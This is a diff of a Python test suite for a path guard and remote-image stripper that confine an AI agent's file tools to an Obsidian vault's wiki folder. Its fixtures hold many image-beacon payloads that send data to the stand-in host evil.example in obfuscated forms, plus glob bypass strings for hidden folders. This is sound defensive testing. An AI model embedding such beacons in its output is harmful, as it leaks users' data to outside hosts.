@@ -52,8 +52,8 @@ def main():
         assert call({"path": str(vault)}, roots, tool="Glob") is None, "Glob inside must be allowed"
         assert call({"file_path": "/tmp/evil.md"}, roots, tool="Write") == "deny", "Write outside must be denied"
 
-        # A tool input with no path at all is not the guard's business.
-        assert call({"pattern": "TODO"}, roots, tool="Grep") is None, "a pathless call must pass through"
+        # A pathless Grep searches cwd (the vault root, .obsidian/ included), so it is refused.
+        assert call({"pattern": "TODO"}, roots, tool="Grep") == "deny", "a pathless Grep must be denied"
 
         # Misconfiguration fails closed rather than open.
         assert call({"file_path": str(inside)}, []) == "deny", "an empty allowlist must deny"
@@ -83,13 +83,22 @@ def main():
         assert call({"file_path": str(vault / "wiki" / "x.canvas")}, roots2, tool="Write", write=wiki) == "deny", "a .canvas write must be denied"
         assert call({"file_path": str(vault / "wiki" / "x.html")}, roots2, tool="Edit", write=wiki) == "deny", "an .html write must be denied"
         assert call({"file_path": str(vault / "wiki" / "pages" / "x.MD")}, roots2, tool="Write", write=wiki) is None, "suffix check ignores case"
-        # A glob that reaches a hidden folder is denied; an ordinary one passes.
-        assert call({"path": str(vault), "glob": ".obsidian/**/*.js"}, roots2, tool="Grep") == "deny", "Grep glob into .obsidian"
-        assert call({"path": str(vault), "pattern": "**/.claude/*"}, roots2, tool="Glob") == "deny", "Glob pattern into .claude"
-        assert call({"pattern": "{.obsidian,pages}/*"}, roots2, tool="Glob") == "deny", "a brace alternative counts too"
-        assert call({"path": str(vault), "glob": "**/*.md"}, roots2, tool="Grep") is None, "*.md is not a hidden path"
-        assert call({"path": str(vault), "pattern": "pages/**/*.md"}, roots2, tool="Glob") is None
-        assert call({"path": str(vault), "pattern": ".obsidian"}, roots2, tool="Grep") is None, "Grep's pattern is a regex, not a path"
+        # Grep reads hidden files, so Glob and Grep need a path under wiki/ or the skill root.
+        w = str(vault / "wiki")
+        assert call({"pattern": "x"}, roots2, tool="Grep", write=wiki) == "deny", "Grep with no path"
+        assert call({"pattern": "x", "path": str(vault)}, roots2, tool="Grep", write=wiki) == "deny", "Grep path=VAULT"
+        assert call({"pattern": "x", "path": w}, roots2, tool="Grep", write=wiki) is None, "Grep path=VAULT/wiki"
+        assert call({"pattern": "*.md", "path": str(other)}, roots2, tool="Glob", write=wiki) is None, "Glob path=skill root"
+        assert call({"pattern": "*.md", "path": str(vault / ".obsidian")}, roots2, tool="Glob", write=wiki) == "deny"
+        # Globs: narrow alphabet, relative, no dot folders.
+        for g in ("**/[.]obsidian/**", "[.]obsidian/**", "?obsidian/**", "/Users/x/**", "**/{.obsidian,pages}/**",
+                  ".obsidian/**/*.js", "~/x/*", "pages\\*.md", "!(x)"):
+            assert call({"pattern": g, "path": w}, roots2, tool="Glob", write=wiki) == "deny", f"Glob {g}"
+            assert call({"pattern": "x", "glob": g, "path": w}, roots2, tool="Grep", write=wiki) == "deny", f"Grep glob {g}"
+        for g in ("pages/**/*.md", "**/*.md", "{pages,meetings}/*.md"):
+            assert call({"pattern": g, "path": w}, roots2, tool="Glob", write=wiki) is None, f"Glob {g}"
+            assert call({"pattern": "x", "glob": g, "path": w}, roots2, tool="Grep", write=wiki) is None, f"Grep glob {g}"
+        assert call({"pattern": "[.]obsidian|\\?", "path": w}, roots2, tool="Grep", write=wiki) is None, "Grep's pattern is a regex"
 
     check_settings()
     print("ingest path guard: all checks pass")
@@ -129,44 +138,52 @@ def check_settings():
 
 
 def check_strip_images(fp, vault):
-    """Remote images are stripped from the pages the child wrote, in every form; local embeds,
-    plain links, fenced code and pages the child didn't write stay."""
+    """Lines with a remote marker and an embed marker are deleted from the wiki pages the child
+    wrote; plain links, local images and marker-free fences stay; paths outside wiki/ are ignored."""
     page = vault / "wiki" / "pages" / "p.md"
     page.parent.mkdir(parents=True, exist_ok=True)
-    other = vault / "wiki" / "other.md"
-    other.write_text("![x](https://evil.example/other.png)\n")
-    page.write_text(
-        "# P\n\nKeep ![[local.png]] and ![l](assets/a.png).\n"
-        "![beacon](https://evil.example/?d=secret)\n"
-        "![alt that\nspans lines](http://evil.example/multi)\n"
-        "![ent](&#104;ttps://evil.example/entity)\n"
-        "![proto](//evil.example/proto)\n"
-        "![data](data:image/svg+xml;evil)\n"
-        "![ref][r1] uses a definition\n"
-        "[r1]: https://evil.example/ref.png\n"
-        "[r2]: &#104;ttps://evil.example/ref2\n"
-        "<img src=\"http://evil.example/x.gif\" width=1>\n"
-        "<IMG alt=y SRC='//evil.example/y'>\n"
-        "<img srcset=\"https://evil.example/s.png 2x\">\n"
-        "<iframe src=\"https://evil.example/frame\"></iframe>\n"
-        "<video src=\"https://evil.example/v.mp4\"></video>\n"
-        "<audio src=\"https://evil.example/a.mp3\"></audio>\n"
-        "<source src=\"https://evil.example/s.webm\">\n"
-        "<embed src=\"https://evil.example/e.swf\">\n"
-        "A [link](https://example.com) is not an image.\n"
-        "```md\n![kept](https://fence.example/in-code.png)\n```\n")
-    line = json.dumps({"type": "assistant", "message": {"content": [
+    outside = vault / "notes.md"
+    outside.write_text("![x](https://evil.example/outside.png)\n")
+    bypasses = [
+        "![beacon](https://evil.example/?d=secret)",
+        "![a [nested] alt](https://evil.example/nested)",
+        "![escaped \\] bracket](https://evil.example/escaped)",
+        "![bs](http\\s\\://evil.example/backslashed)",
+        "![ent](&#104;ttps://evil.example/entity)",
+        "![proto](//evil.example/proto)",
+        "![ref][r1] uses a definition",
+        "[r1]: https://evil.example/ref.png",
+        '<img alt="a > b" src="https://evil.example/q.gif">',
+        "<IMG SRC='//evil.example/y'>",
+        '<img srcset="https://evil.example/s.png 2x">',
+        '<video poster="https://evil.example/p.jpg"></video>',
+        '<iframe src="https://evil.example/frame"></iframe>',
+        '<audio src="https://evil.example/a.mp3"></audio>',
+        '<source src="https://evil.example/s.webm">',
+        '<embed src="https://evil.example/e.swf">',
+        "```",
+        "![in a fence](https://evil.example/fenced)",
+        "```",
+    ]
+    keep = ["# P", "[Q3]: target: 10%", '![l](assets/a.png "note: x")', "Keep ![[local.png]] too.",
+            "[see](https://e/x)", "```md", "no remote marker in this fence", "```"]
+    page.write_text("\n".join(keep[:2] + bypasses + keep[2:]
+                              + ["[r2]:", "    https://evil.example/next-line.png", "tail"]) + "\n")
+    events = [json.dumps({"type": "assistant", "message": {"content": [
         {"type": "tool_use", "name": "Write", "input": {"file_path": "wiki/pages/p.md", "content": "..."}},
-        {"type": "tool_use", "name": "Read", "input": {"file_path": "wiki/other.md"}}]}})
-    written = fp.written_paths(line)
-    assert written == ["wiki/pages/p.md"], f"only Write/Edit targets count: {written}"
+        {"type": "tool_use", "name": "Write", "input": {"file_path": "notes.md", "content": "..."}},
+        {"type": "tool_use", "name": "Edit", "input": {"file_path": str(vault / "wiki" / "CLAUDE.md")}},
+        {"type": "tool_use", "name": "Write", "input": {"file_path": "wiki/x.canvas"}},
+        {"type": "tool_use", "name": "Read", "input": {"file_path": "wiki/other.md"}}]}})]
+    written = [p for e in events for p in fp.written_paths(e)]
+    assert written == [page.resolve()], f"only .md wiki pages the child wrote count: {written}"
     fp.strip_remote_images(written)
     text = page.read_text()
-    assert "evil" not in text, f"remote images must be stripped: {text}"
-    assert "![[local.png]]" in text and "![l](assets/a.png)" in text, "local embeds must stay"
-    assert "[link](https://example.com)" in text, "plain links must stay"
-    assert "https://fence.example/in-code.png" in text, "fenced code is left verbatim"
-    assert "evil" in other.read_text(), "pages the child didn't write are left alone"
+    assert "evil" not in text, f"every bypass must be deleted: {text}"
+    for k in keep + ["tail"]:
+        assert k + "\n" in text, f"kept line lost: {k!r}"
+    assert "[r2]:" not in text, "a definition with its destination on the next line goes too"
+    assert "evil" in outside.read_text(), "a path outside wiki/ is ignored and its file untouched"
 
 
 if __name__ == "__main__":
